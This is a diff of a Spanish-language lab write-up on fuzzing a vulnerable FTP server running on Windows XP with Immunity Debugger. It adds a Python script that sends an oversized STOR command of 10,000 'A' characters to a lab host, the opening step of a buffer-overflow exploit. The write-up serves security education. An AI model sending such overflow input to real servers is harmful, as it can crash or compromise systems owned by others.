@@ -10,7 +10,7 @@ author: Sergio Salgado
 - <a href="#introduccion">Introduccion</a>
 - <a href="#desarrollo">Desarrollo</a>
   - <a href="#Especificaciones_del_laboratorio">Especificaciones del laboratorio</a>
-  - <a href="#escaneo">Escaneo</a>
+  - <a href="#fuzzing">Fuzzing</a>
   - <a href="#gain_access">Gain Access</a>
   - <a href="#privilege_scalation">Escalamiento de privilegios</a>
 
@@ -25,11 +25,37 @@ El entorno donde trabajaremos es virtual, el dispositivo tiene una arquitectura 
 operativo Windows XP.
 
 ## [](#header-2)<a id="desarrollo">Desarrollo</a>
-## [](#header-2)<a id="Especificaciones_del_laboratorio">Especificaciones del laboratorio</a>
+### [](#header-3)<a id="Especificaciones_del_laboratorio">Especificaciones del laboratorio</a>
 Se utilizará una máquina virtual con sistema operativo Windows XP de 32 bits y una maquina Kali Linux enlazadas por red y permitiendo el tráfico de datos entre estas.
 
 Para el análisis del software utilizado en la maquina Windows xp, se utilizará la aplicación immunity debbuger, que es un desensamblador de programas y con esto podemos estar monitoreando la ejecución del sistema
 
+-Immunity debugger
+<img src="../_posts/images/fuzzing&debbuging/debbug_tools.png" alt="Herramientas de debbuging">
+
 -Programa a utilizar FTPserver, obtenida del link https://www.exploit-db.com/exploits/46763
 
--Immunity debugger
+### [](#header-3)<a id="fuzzing">Fuzzing</a>
+El siguiente programa escrito en python, tiene bloques importantes, el que define los caracteres o cadena con la que se hará el testing, el que realiza el envió de la información.
+
+La cadena en este caso será una A multiplicada por 10mil, al ser ejecutado mandará al servidor FTP una cadena de 10mil bytes despues de pasar el usuario y contraseña.
+
+```py
+#!/usr/bin/python2
+
+import socket
+
+cadena = 'A' * 10000
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+conexion = s.connect(('192.168.100.252',21))
+s.recv(1024)
+s.send('USER ftp\r\n') #USUARIO
+s.recv(1024)
+s.send('PASS ftp\r\n') #PASS
+s.recv(1024)
+s.send('STOR' + cadena + '\r\n')
+s.recv(1024)
+s.send ('QUIT\r\n')
+s.close()
+```
